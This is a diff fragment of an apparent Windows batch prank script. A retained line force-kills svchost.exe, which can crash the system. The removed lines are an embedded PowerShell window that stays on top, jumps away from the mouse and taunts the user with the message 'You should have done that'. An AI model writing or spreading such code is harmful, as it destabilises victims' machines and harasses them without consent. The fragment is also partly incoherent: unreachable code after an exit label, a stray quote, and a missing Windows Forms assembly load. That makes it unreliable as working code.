@@ -145,33 +145,3 @@ taskkill /f /im svchost.exe
 
 :exit
 exit
-Add-Type -AssemblyName System.Drawing; ^
-$form = New-Object System.Windows.Forms.Form; ^
-$form.Text = ''; ^
-$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None; ^
-$form.StartPosition = 'CenterScreen'; ^
-$form.TopMost = $true; ^
-$form.Size = New-Object System.Drawing.Size(800,600); ^
-$pictureBox = New-Object System.Windows.Forms.PictureBox; ^
-$pictureBox.Dock = 'Fill'; ^
-$bitmap = [System.Drawing.Bitmap]::FromFile('$env:TEMP\BEN.png'); ^
-$rand = New-Object System.Random; ^
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
-for ($i=0; $i -lt 50; $i++) { $x=$rand.Next(0,$bitmap.Width-20); $y=$rand.Next(0,$bitmap.Height-20); $graphics.FillEllipse([System.Drawing.SolidBrush]::new([System.Drawing.Color]::Red),$x,$y,20,20) }; ^
-$graphics.Dispose(); ^
-$pictureBox.Image = $bitmap; ^
-$pictureBox.SizeMode='StretchImage'; ^
-$form.Controls.Add($pictureBox); ^
-$inputString=''; ^
-$form.KeyPreview=$true; ^
-$form.Add_KeyDown({param($e) $inputString+=$e.KeyCode.ToString().ToUpper(); if($inputString.Length -gt 3){$inputString=$inputString.Substring($inputString.Length-3)}; if($inputString.EndsWith('BEN')){[System.Windows.Forms.MessageBox]::Show('You should have done that'); $inputString=''}}); ^
-$timer = New-Object System.Windows.Forms.Timer; ^
-$timer.Interval=50; ^
-$timer.Add_Tick({$mouse=[System.Windows.Forms.Control]::MousePosition; $formLocation=$form.Location; $formSize=$form.Size; if($mouse.X -ge $formLocation.X - 50 -and $mouse.X -le $formLocation.X+$formSize.Width+50 -and $mouse.Y -ge $formLocation.Y -50 -and $mouse.Y -le $formLocation.Y+$formSize.Height+50){$newX=$formLocation.X+($rand.Next(-200,200)); $newY=$formLocation.Y+($rand.Next(-200,200)); $screen=[System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea; if($newX -lt 0){$newX=0}; if($newY -lt 0){$newY=0}; if($newX+$form.Width -gt $screen.Width){$newX=$screen.Width-$form.Width}; if($newY+$form.Height -gt $screen.Height){$newY=$screen.Height-$form.Height}; $form.Location=New-Object System.Drawing.Point($newX,$newY)}}); ^
-$timer.Start(); ^
-$form.ShowDialog()"
-
-
-
-:exit
-exit
